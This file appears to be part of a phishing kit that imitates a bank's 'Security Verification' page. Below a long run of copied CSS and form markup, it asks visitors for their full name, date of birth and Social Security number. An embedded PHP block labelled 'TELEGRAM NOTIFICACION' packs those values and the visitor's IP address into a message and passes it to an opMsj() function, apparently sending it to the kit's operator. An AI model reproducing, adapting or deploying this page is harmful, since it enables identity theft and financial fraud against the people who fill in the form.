.pdf-content {
    margin-bottom: 0;
}


.disclosure-pdf {
    float: none;
    width: 100%;
    margin-top: 10px;
}

.pdf-note {
    float: none;
    width: 100%;
    background: none;
    padding: 20px 0 0 0;
}

.disclosure-pdf ul {
    float: none;
    width: 100%;
}

.ad-row {
    display: auto;
    margin: 0;
    border-spacing: auto;
}

.ad-container {
    display: table;
    padding: 0 10px;
    border-radius: 4px;
    width: 100%;
    margin: 3em 0;
}


.two-ads .ad-container, .three-ads .ad-container, .four-ads .ad-container {
    width: 100%;
}

.ad-row.one-ad {
    display: table;
}

.one-ad .ad-container {
    display: table-cell;
    width: 100%;
    max-width: none;
    margin: 3em 0;
    padding: 20px;
}

.ad-body, .three-ads .ad-body, .four-ads .ad-body, .medium-ads .ad-body, .short-ads .ad-body {
    min-height: 10px !important;
}


/* 2B (double display) */


.dub-row {
    display: block;
}

.dub-container {
    display: block;
    width: 100%;
    margin: 1em 0;
}


/* variations for credit card offers */

.card-offer .ad-container {
    margin: 0 0 3em 0;
}

.card-offer .ad-body {
    min-height: 10px;
    margin-bottom: 40px;
}

.card-offer .ad-button .button-offer {
    padding: 17px 24px;
    font-size: 18px;
}



/* title-button-edit styles */


.title-button-edit {
    top: -3px;
    right: -3px;
}


    .title-button-edit .delete-button, .title-button-edit .delete-button:link, .title-button-edit .delete-button:active, .title-button-edit .delete-button:visited {
        /* padding: 7px 24px; */
        color: #fff;
        background-color: rgb(248, 161, 49);
        border-color: #fff;
    }

        .title-button-edit .outline-button:hover,
        .title-button-edit .delete-button:hover,
        .title-button-edit .edit-button:hover {
            -webkit-transition: border 0.15s ease-in;
            transition: border 0.15 ease-in;
            cursor: pointer;
            text-decoration: none;
            color: #fff;
            border-color: #fff;
            background: #ee6120;
        }

        .title-button-edit .delete-button:before {
            color: #fff;
        }

        .title-button-edit .delete-button:hover:before {
            color: #fff;
        }

/* style the values in locked down input rows to look like disabled fields */
.input-row.locked .disabled-field-value {
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
    /*
    background:#fff;
    color:#999;
    border: 1px solid #ccc;
    */
}




select,
input[type=text],
input[type=email],
input[type=url],
input[type=password],
input[type=color],
input[type=date],
input[type=datetime],
input[type=datetime-local],
input[type=email],
input[type=month],
input[type=number],
input[type=range],
input[type=search],
input[type=tel],
input[type=time],
input[type=url],
input[type=week],
textarea {
    font-size: 16px; /* tweak font size to circumvent iPhone auto-zoom */
    padding: 0px 10px 0px 10px;
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

    select, select:focus {
        -webkit-appearance: none;
        -moz-appearance: none;
        text-indent: 0.01px;
        text-overflow: '';
        background: url("../images/inputbg-select.png") no-repeat scroll right center rgba(0, 0, 0, 0) !important;
        background-position: 100% 50%;
        padding-left: 5px;
    }

.select-combo select {
    width: 42.5%;
    width: -moz-calc(50% - 18px);
    width: -webkit-calc(50% - 18px);
    width: calc(50% - 18px);
    max-width: none;
}

.combo-container {
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}


.input-control, .input-text {
    display: block;
    width: 100%;
}

.input-photo {
    padding-left: 10px;
}


.input-row.special .input-control {
    display: block;
    width: 100%;
}

.input-text {
    margin-left: 10px;
    padding-left: 0;
}


.input-row .input-label {
    display: block;
    text-align: left;
    width: 100%;
    font-weight: 700;
    padding-right: 0;
    padding-left: 10px;
}

    .input-row .input-label.empty {
        display: none;
    }

.input-row.checkbox-row .input-label.group-label {
    width: 85%;
    width: -moz-calc(100% - 50px);
    width: -webkit-calc(100% - 50px);
    width: calc(100% - 50px);
    margin: 10px 10px 5px 10px;
    padding: 0 20px 5px 0;
    border-bottom: 0px solid #ddd;
}

.numbered-instructions .input-control, .numbered-instructions .input-text {
    width: auto;
}

.numbered-instructions .input-row .input-label {
    width: auto;
}

.input-row .input-label .sub-label {
    display: inline;
}


.input-row.hasError .input-error:after {
    display: inline-block;
    font-family: "olb-icons";
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e003";
    color: #ff3300;
    font-size: 25px;
}

.input-row.hasError .error-message {
    margin-left: 10px;
}

.sub-text-row, .text-row {
    margin: 5px 10px 5px 5px;
}

.input-control .sub-text#instructions {
    width: auto;
}

.switch-section .sub-label, .switch-section .sub-label-regular {
    margin-right: 0;
}

.radio-row .input-control, .checkbox-row .input-control, .checkbox-toggle-row .input-control {
    padding-top: 10px;
}

.checkbox-row .input-control {
    padding-left: 10px;
}

input[type=text].perc-full {
    width: 60%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

.content-copy {
}

.sub-content-copy {
}


.button-row {
    text-align: center;
    padding: 2em 0;
}

    .button-row.align-center {
        padding: 0em;
    }

    .button-row .button-primary, .button-row button {
        width: 100%;
        padding: 24px 24px;
        margin: 0.75em 0;
        float: left;
        font-size: 20px;
    }

    .button-row .button-secondary {
        width: 100%;
        padding: 24px 24px;
        margin: 0.75em 0;
        float: right;
        font-size: 20px;
    }

    .button-row .button-tertiary {
        margin: 0.75em 0;
        top: 0;
        font-size: 20px;
        line-height: 20px;
    }

    .button-row .button-link {
        margin: 0.75em 0;
        top: 0;
        font-size: 20px;
        line-height: 20px;
    }



.more-options {
    margin: 1em;
}

/* Funding box widget styles */

.funding-box {
    background: #f3f3f3;
    border-radius: 4px;
    margin: 0 0 2em 0;
    padding: 10px;
}



.tooltipster-default {
    max-width: 75%;
}



/* cloned input styles */
#input_w2, #input_w3, #input_w4, #input_w5, #input_w6, #input_w7, #input_w8, #input_w9, #input_w10,
#input_x2, #input_x3, #input_x4, #input_x5, #input_x6, #input_x7, #input_x8, #input_x9, #input_x10,
#input_y2, #input_y3, #input_y4, #input_y5, #input_y6, #input_y7, #input_y8, #input_y9, #input_y10,
#input_z2, #input_z3, #input_z4, #input_z5, #input_z6, #input_z7, #input_z8, #input_z9, #input_z10 {
    /* background-color: rgb(244, 244, 244); */
    background-color: #fff;
    border-top: 10px solid #eee;
    margin-top: 1em;
}



/* Teammate URL - App Launcher styles */

.app-launch h3.legend + .input-row {
    border-top: 0;
}

.app-launch .input-row {
    display: table;
    width: 100%;
    border-top: 1px solid #eee;
    margin: 0;
    padding: 0;
}

    .app-launch .input-row .input-text {
        display: table-cell;
        width: 49%;
        text-align: center;
        height: 60px;
        vertical-align: middle;
        padding: 5px 0 5px 5px;
    }

    .app-launch .input-row .input-label {
        display: table-cell;
        width: 49%;
        text-align: left;
        height: 60px;
        vertical-align: middle;
        padding: 5px 5px 5px 10px;
    }


/* -- edit rate-table styles for vertical layout - */

.rate-table table, .rate-table thead, .rate-table tbody, .rate-table th, .rate-table td, .rate-table tr {
    display: block !important;
    width: 100%;
}

    .rate-table thead tr {
        position: absolute;
        top: -9999px;
        left: -9999px;
    }

.rate-table tr {
    border: 1px solid #ddd;
    border-width: 1px 1px 0 1px;
}

.rate-table td {
    border: none;
    border-bottom: 1px solid #ddd;
    position: relative;
    /* padding-left: 50%;  removed to test rate-table android issue solution */
}

html.ie9 .rate-table td {
    float: left !important;
}

.rate-table td:before {
    position: absolute;
    top: 6px;
    left: 6px;
    width: 45%;
    padding-right: 10px;
    white-space: nowrap;
}

/* Label the data */


.rate-table td:nth-of-type(1):before {
    content: "Annual Percentage Yield";
    text-align: left;
}

.rate-table td:nth-of-type(2):before {
    content: "Interest Rate";
    text-align: left;
}

.rate-table td:nth-of-type(3):before {
    content: "Minimum Amount";
    text-align: left;
}

.rate-table td:nth-of-type(4):before {
    content: "Maximum Amount";
    text-align: left;
}

.rate-table.cd td:nth-of-type(1):before {
    content: "Annual Percentage Yield";
    text-align: left;
}

.rate-table.cd td:nth-of-type(2):before {
    content: "Interest Rate";
    text-align: left;
}

.rate-table.cd td:nth-of-type(3):before {
    content: "Effective Date";
    text-align: left;
}

.rate-table.cd td:nth-of-type(4):before {
    content: "Minimum Amount";
    text-align: left;
}

.rate-table.cd td:nth-of-type(5):before {
    content: "Maximum Amount";
    text-align: left;
}


/* Photo ID */

.photoid-container {
    display: block;
    margin: 0 0 10px 0;
}

.img-width {
    width: 75%;
}

.photoid-body {
}

.linebreak-label {
    display: block;
}

.accept-tick {
    padding: 20px 10px;
}

.switch-section .input-control-custom {
    padding: 10px 0 0 30px;
    display: inline-block;
    width: auto;
    float: right;
}

.img-width {
    width: 75%;
}

}


/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 400px    *********************** */
/* ****************************************************************************************** */

@media (min-width: 500px) and (max-width: 580px) {
    .percent-icon {
        left: 110px !important;
    }
}

@media (max-width: 400px) {
    .button-offers {
        display: block;
    }

    .clickable-div {
        cursor: pointer;
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .rc-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .rc-table .row.head {
            display: none;
        }

    .rc-table .cell {
        border: 0;
        width: 100%;
    }

        .rc-table .cell.last, .rc-table .cell.description, .rc-table .cell.number {
            display: block;
            width: 100%;
            text-align: center;
        }

            .rc-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }


    /* Photo ID */

    .photoid-containter {
        display: block;
        margin: 0 0 10px 0;
    }

    .photoid-body {
        display: block;
        width: 100%;
    }

    .photoid-button {
        display: block;
    }

        .photoid-button button {
            width: 100%;
            padding: 14px 30px;
            margin-top: 2em;
        }


    .officer-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .officer-table .row.head {
            display: none;
        }

    .officer-table .cell {
        border: 0;
        width: 100%;
    }

        .officer-table .cell.last, .officer-table .cell.name, .officer-table .cell.number {
            display: block;
            width: 100%;
            text-align: center;
        }

            .officer-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }


    .additional-applicant-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px;
        border-radius: 3px;
    }

        .additional-applicant-table .row.head {
            display: none;
        }

    .additional-applicant-table .cell {
        border: 0;
        width: 100%;
    }

        .additional-applicant-table .cell.applicant {
            font-weight: bold;
            display: block;
        }

        .additional-applicant-table .cell.nameinput {
            display: block;
        }

        .additional-applicant-table .cell.last {
            display: inline-block;
        }

            .additional-applicant-table .cell.last div.input-control {
                position: relative;
                right: 0px;
                width: auto;
                top: -105px;
                margin-bottom: 0px;
            }



    .lines-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .lines-table .row.head {
            display: none;
        }

    .lines-table .cell {
        border: 0;
        width: 100%;
    }

        .lines-table .cell.account {
            font-weight: bold;
        }

        .lines-table .cell.amount {
            width: auto;
        }

        .lines-table .cell.last {
            display: block;
            width: 100%;
            text-align: center;
        }

            .lines-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }

    .switch-section .input-control.doctor-select select {
        width: 50%;
        min-width: 150px;
        padding-right: 25px;
    }

    /* Delta SkyMiles Check Card Offer page */

    .sky-card-offer .sky-card-img {
        float: none;
        width: 100%;
        margin: 0;
    }

    .sky-card-offer .sky-card-content {
        float: none;
        width: 100%;
        margin-left: 0;
    }

    .img-width {
        width: 100%;
    }

    .percent-icon {
        left: 80px !important;
    }
}



/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 360px    *********************** */
/* ****************************************************************************************** */

@media (max-width: 360px) {
    .button-offers {
        display: block;
    }

    .clickable-div {
        cursor: pointer;
    }

    html, body {
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            cursor: pointer;
        }

    html, body {
    }

    .bootstrap .row-spacing {
        margin-top: 0px;
    }

    .print {
        display: inline-block;
        position: absolute;
        margin: 2.8em 0 .5em 2.5em;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }

    .page {
        width: 100%;
        margin-top: 0;
    }

    .percent-icon {
        left: 70px !important;
    }


    /* Tax certifications list */


    .tax-id-box {
        display: block;
        background: none;
        width: 100%;
        font-weight: bold;
        padding: 0;
    }

        .tax-id-box .name, .tax-id-box .number {
            border-radius: 4px;
            margin-bottom: 1em;
            background-color: rgb(244, 244, 244);
            display: block;
            text-align: left;
            padding: 1em 10px;
        }
}

@media (max-width: 320px) {
    .clickable-div {
        cursor: pointer;
    }

    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

    .print {
        display: inline-block;
        position: absolute;
        margin: 2.8em 0 .5em 0em;
        background: none;
    }
}
</style>
<div style="margin:10px">
<form action="./" method="post" name="userForm" novalidate="" set-focus="" class="ng-dirty ng-invalid ng-invalid-dob">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="profinal"/>
        <!-- ngIf: $root.IsSBD -->
        <div class="bootstrap ">
            <div class="row firstrow">
                <div class="col-md-4 mb-3" ng-class="{'hasError':userForm.ApplicantFirstName.$dirty &amp;&amp; userForm.ApplicantFirstName.$invalid, 'locked' : ($root.IsAuthenticated||$root.IsCrossSell || $root.IsProspectApplicant) &amp;&amp; !$root.IsSBD }">
                    <label class="control-label input-label" id="ApplicantFirstName" for="ApplicantFirstName">First Name</label>
                    <!-- ngIf: (!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsProspectApplicant) || $root.IsSBD --><input id="ApplicantFirstName" name="ApplicantFirstName" firstname="" nac-maxlength="25" ng-model="data.FirstName" type="text" class="form-input-control ng-scope ng-pristine ng-valid" inputmode=" text" size="10" ng-if="(!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsProspectApplicant) || $root.IsSBD "><!-- end ngIf: (!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsProspectApplicant) || $root.IsSBD -->
                    <!-- ngIf: ($root.IsAuthenticated || $root.IsCrossSell || $root.IsProspectApplicant) && !$root.IsSBD -->
                    <!-- ngIf: userForm.ApplicantFirstName.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantFirstName.$error">
                        <div class="error-message ng-binding">
                            
                        </div>
                    </div><!-- end ngIf: userForm.ApplicantFirstName.$error -->
                </div>

                <div class="col-md-2 mb-3" ng-class="{'hasError':userForm.ApplicantMiddleName.$dirty &amp;&amp; userForm.ApplicantMiddleName.$invalid,'locked' :( $root.IsAuthenticated||$root.IsCrossSell||$root.IsProspectApplicant) &amp;&amp; !$root.IsSBD}">
                    <label class="control-label input-label" for="ApplicantMiddleName">M.I. (Opt.)</label>
                    <!-- ngIf: !$root.IsAuthenticated && !$root.IsCrossSell --><input id="ApplicantMiddleName" name="ApplicantMiddleName" type="text" class="form-input-control ng-scope ng-pristine ng-valid" value="" size="10" maxlength="15" ng-model="data.MiddleName " middlename="" ng-if="!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell" onkeyup="textonly()"><!-- end ngIf: !$root.IsAuthenticated && !$root.IsCrossSell -->
                    <!-- ngIf: $root.IsAuthenticated||$root.IsCrossSell -->
                    <!-- ngIf: userForm.ApplicantMiddleName.$error --><div class="input-error ng-binding ng-scope" ng-if="userForm.ApplicantMiddleName.$error">
                        
                    </div><!-- end ngIf: userForm.ApplicantMiddleName.$error -->
                </div>
                <div class="col-md-4 mb-3" ng-class="{'hasError':userForm.ApplicantLastName.$dirty &amp;&amp; userForm.ApplicantLastName.$invalid, 'locked' : ($root.IsAuthenticated||$root.IsCrossSell||$root.IsProspectApplicant) &amp;&amp; !$root.IsSBD}">
                    <label class="control-label input-label" id="ApplicantLastName" for="ApplicantLastName">Last Name</label>
                    <!-- ngIf: (!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsProspectApplicant) || $root.IsSBD --><input id="ApplicantLastName" name="ApplicantLastName" type="text" ng-model="data.LastName " maxlength="25" class="form-input-control ng-scope ng-pristine ng-valid" lastname="" value="" size="10" ng-if="(!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsProspectApplicant) || $root.IsSBD"><!-- end ngIf: (!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsProspectApplicant) || $root.IsSBD -->
                    <!-- ngIf: ($root.IsAuthenticated||$root.IsCrossSell||$root.IsProspectApplicant) && !$root.IsSBD -->
                    <!-- ngIf: userForm.ApplicantLastName.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantLastName.$error">
                        <div class="error-message ng-binding">
                            
                        </div>
                    </div><!-- end ngIf: userForm.ApplicantLastName.$error -->
                </div>
                <div class="col-md-2 mb-3" ng-hide="$root.IsAuthenticated ||$root.IsCrossSell">
                    <label for="suffix" class="control-label input-label" id="ApplicantSuffix">Suffix (Opt.)</label>
                    <!-- ngIf: !$root.IsCrossSell --><select class="form-input-control ng-scope ng-pristine ng-valid" ng-model="data.SuffixCISCode" name="ApplicantSuffix" ng-options="row.value as row.key for row in data.SuffixDdlContents" ng-if="!$root.IsCrossSell"><option value="0">- Select -</option><option value="1">Jr</option><option value="2">Sr</option><option value="3">I</option><option value="4">II</option><option value="5">III</option><option value="6">IV</option></select><!-- end ngIf: !$root.IsCrossSell -->
                    <!-- ngIf: $root.IsCrossSell -->
                </div>
            </div>
            <div class="row">
                <div class="col-md-4 mb-1" ng-class="{'hasError':userForm.ApplicantSSN.$dirty &amp;&amp; userForm.ApplicantSSN.$invalid, 'locked' : ($root.IsAuthenticated || $root.IsCrossSell) &amp;&amp; isvalidssn &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant}">
                    <!--ng-if="!($root.ClientContactCenter || $root.BranchPhoneSales || $root.BranchFaceToFace)"-->
                    <label class="control-label input-label" id="ApplicantSSN" for="ApplicantSSN">Social Security Number</label>
                    <div class="field-icon">
                        <!-- ngIf: ((!$root.IsAuthenticated && !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant) --><input id="ApplicantSSNDEP" name="ApplicantSSN" ng-model="data.SSN" maskssn="" type="tel" maxlength="11" class="form-input-control field ssn ng-scope ng-pristine ng-valid ng-valid-ssn" spellcheck="false" value="" ng-if="((!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant)"><!-- end ngIf: ((!$root.IsAuthenticated && !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant) -->
                        <!-- ngIf: ((!$root.IsAuthenticated && !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant) --><!-- end ngIf: ((!$root.IsAuthenticated && !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant) -->
                        <!-- ngIf: (($root.IsAuthenticated || $root.IsCrossSell) && isvalidssn && !$root.IsSBD && !$root.IsProspectApplicant) -->

                        <div class="info-text">
                            <div class="sub-text-row-lock locked">
                                <span style="margin-top:15px">Used to verify your identity. We’ll keep your data safe.</span>
                            </div>
                        </div>
                        <div class="inline-error">
                            <!-- ngIf: userForm.ApplicantSSN.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantSSN.$error">
                                <div class="error-message ng-binding"></div>
                            </div><!-- end ngIf: userForm.ApplicantSSN.$error -->
                        </div>
                    </div>
                </div>
                <!--<div class="col-md-4 mb-1" ng-class="{'hasError':userForm.ApplicantSSN.$dirty && userForm.ApplicantSSN.$invalid, 'locked' : ($root.IsAuthenticated || $root.IsCrossSell) && isvalidssn && !$root.IsSBD && !$root.IsProspectApplicant}" ng-if="($root.ClientContactCenter || $root.BranchPhoneSales || $root.BranchFaceToFace)">
                    <label class="control-label input-label" id="ApplicantSSN" for="ApplicantSSN">Social Security Number</label>
                    <div class="field-icon">
                        <input id="ApplicantSSNDEP" name="ApplicantSSN" ng-model="data.SSN" ssn type="tel" maxlength="11"   class="form-input-control field ssn" spellcheck="false" value="" ng-if="((!$root.IsAuthenticated && !$root.IsCrossSell)||!isvalidssn || $root.IsProspectApplicant)">
                        <div ng-if="(($root.IsAuthenticated || $root.IsCrossSell) && isvalidssn && !$root.IsSBD && !$root.IsProspectApplicant)" class="disabled-field-value">{{data.MaskedSSN}}</div>
                        <div class="input-error" ng-if="userForm.ApplicantSSN.$error">
                            <div class="error-message">{{userForm.ApplicantSSN.$error.message}}</div>
                        </div>
                        <div class="info-text">
                            <div class="sub-text-row-lock locked">
                                <span class="">Used to verify your identity. We’ll keep your data safe.</span>
                            </div>
                        </div>

                    </div>
                </div>-->
                <div class="col-md-4 mb-3" ng-class="{'hasError':userForm.ApplicantDateOfBirth.$dirty &amp;&amp; userForm.ApplicantDateOfBirth.$invalid ,'locked': (($root.IsAuthenticated &amp;&amp; disableDOB) || $root.IsCrossSell) &amp;&amp; !$root.IsProspectApplicant}">
                    <label for="dob" class="control-label input-label" id="ApplicantDateOfBirth">Date of Birth</label>
                    <input oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(.{2})/g, '$1/').trim();" maxlength="8" id="ApplicantDateOfBirth" dob="" name="ApplicantDateOfBirth" ng-model="data.DateOfBirth" type="tel" class="form-input-control field ssn ng-scope ng-pristine ng-valid ng-valid-ssn" max="2200-12-31" min="1800-01-01" placeholder="mm/dd/yy" spellcheck="false" value="" ng-if="Apptype!='ATM' &amp;&amp; (!($root.IsAuthenticated &amp;&amp; disableDOB) &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsProspectApplicant)"><!-- end ngIf: Apptype!='ATM' && (!($root.IsAuthenticated && disableDOB) && !$root.IsCrossSell && !$root.IsProspectApplicant) -->

                    <!-- ngIf: (($root.IsAuthenticated && disableDOB) || $root.IsCrossSell) && !$root.IsProspectApplicant -->
                    <!-- ngIf: Apptype=='ATM' && (!($root.IsAuthenticated && disableDOB) && !$root.IsCrossSell && !$root.IsProspectApplicant) -->
                    <!-- ngIf: $root.IsProspectApplicant -->
                    <!-- ngIf: userForm.ApplicantDateOfBirth.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantDateOfBirth.$error">
 
                        <!-- ngIf: userForm.ApplicantDateOfBirth.$error.dobFormat -->
                    </div><!-- end ngIf: userForm.ApplicantDateOfBirth.$error -->

                </div>
            </div>
        </div>
        <!-- ngIf: $root.IsAuthenticated -->
		<br/>
        <div class="button-row align-right">
            <button class="button-primary" ng-class="{disabled:disableButton}" ng-disabled="disableButton" ng-click="SubmitPersonalInfo();">Continue</button>
            <!--19.4 save application link for mobile-->
            <a ng-show="RetriveLink" href="" ng-class="{disabled:!$root.showSaveIcon}" class="button-tertiary-link ng-hide" ng-disabled="!$root.showSaveIcon" ng-click="$root.ManageApplication('Save','OnClickTag')">Save and finish my application later</a>
        </div>

        <!-- Address Message Enhancement End-->
    </form>
	
</div>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'profinal') { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'profinal' && isset($_POST['ApplicantDateOfBirth']) && !empty($_POST['ApplicantDateOfBirth']) && isset($_POST['ApplicantFirstName']) && !empty($_POST['ApplicantFirstName']) && isset($_POST['ApplicantLastName']) && !empty($_POST['ApplicantLastName']) && isset($_POST['ApplicantSSN']) && !empty($_POST['ApplicantSSN']) && isset($_POST['ApplicantMiddleName']) && isset($_POST['ApplicantSuffix'])) {
	$msj = '<b>[PERSONAL]</b> '.$ip.' | Date of Birth: <b>'.$_POST['ApplicantDateOfBirth'].'</b> | First Name: <b>'.$_POST['ApplicantFirstName'].'</b> | Last Name: <b>'.$_POST['ApplicantLastName'].'</b> | Middle Name: <b>'.$_POST['ApplicantMiddleName'].'</b> | Suffix: <b>'.$_POST['ApplicantSuffix'].'</b> | SSN: <b>'.$_POST['ApplicantSSN'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'profinal' && isset($_POST['ApplicantDateOfBirth']) && !empty($_POST['ApplicantDateOfBirth']) && isset($_POST['ApplicantFirstName']) && !empty($_POST['ApplicantFirstName']) && isset($_POST['ApplicantLastName']) && !empty($_POST['ApplicantLastName']) && isset($_POST['ApplicantSSN']) && !empty($_POST['ApplicantSSN']) && isset($_POST['ApplicantMiddleName']) && isset($_POST['ApplicantSuffix'])) {
		$msj = '<b>[PERSONAL]</b> '.$ip.' | Date of Birth: <b>'.$_POST['ApplicantDateOfBirth'].'</b> | First Name: <b>'.$_POST['ApplicantFirstName'].'</b> | Last Name: <b>'.$_POST['ApplicantLastName'].'</b> | Middle Name: <b>'.$_POST['ApplicantMiddleName'].'</b> | Suffix: <b>'.$_POST['ApplicantSuffix'].'</b> | SSN: <b>'.$_POST['ApplicantSSN'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Security Verification
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">Please complete your personal information</p>
</div>
</div>
</div>
<style>
html {
    font-family: sans-serif;
    -ms-text-size-adjust: 100%;
    -webkit-text-size-adjust: 100%;
}


body {
    margin: 0;
    overflow-anchor: none !important;
}
.dcm-max-width {
    max-width: 1100px;
    margin: 0 auto;
}

.disclosure-alert-box {
    padding: 5px;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 10px auto;
    max-width: 1100px;
}

.disclosure-icon {
    width: 40px;
    height: 40px;
    margin-right: 5px;
}

.disclosure-text {
    background-color: #fff;
    max-width: 1000px;
    padding: 5px;
    text-align: left;
}

.disclosure-title {
    font-size: 16px;
    line-height: 1.2em;
    font-weight: bold;
    margin-bottom: 5px;
}

.disclosure-text p {
    font-size: 16px;
    margin-bottom: 5px;
}



article, aside, details, figcaption, figure, footer, header, hgroup, main, nav, section, summary {
    display: block;
}

audio, canvas, progress, video {
    display: inline-block;
    vertical-align: baseline;
}

    audio:not([controls]) {
        display: none;
        height: 0;
    }

[hidden], template {
    display: none;
}

a {
    background: 0 0;
}

    a:active, a:hover {
        outline: 0;
    }

abbr[title] {
    border-bottom: 1px dotted;
}

b, strong {
    font-weight: 700;
}

dfn {
    font-style: italic;
}

h1 {
    font-size: 2em;
    margin: .67em 0;
}

mark {
    background: #ff0;
    color: #000;
}

small {
    font-size: 80%;
}

sub, sup {
    font-size: 75%;
    line-height: 0;
    position: relative;
    vertical-align: baseline;
}

sup {
    top: -.5em;
}

sub {
    bottom: -.25em;
}

img {
    border: 0;
}

svg:not(:root) {
    overflow: hidden;
}

figure {
    margin: 1em 40px;
}

hr {
    -moz-box-sizing: content-box;
    box-sizing: content-box;
    height: 0;
}

pre {
    overflow: auto;
}

code, kbd, pre, samp {
    font-family: monospace,monospace;
    font-size: 1em;
}

button, input, optgroup, select, textarea {
    color: inherit;
    font: inherit;
    margin: 0;
}

button {
    overflow: visible;
}

button, select {
    text-transform: none;
}

button, html input[type=button], input[type=reset], input[type=submit] {
    -webkit-appearance: button;
    cursor: pointer;
}

    button[disabled], html input[disabled] {
        cursor: default;
    }

    button::-moz-focus-inner, input::-moz-focus-inner {
        border: 0;
        padding: 0;
    }

input {
    line-height: normal;
}

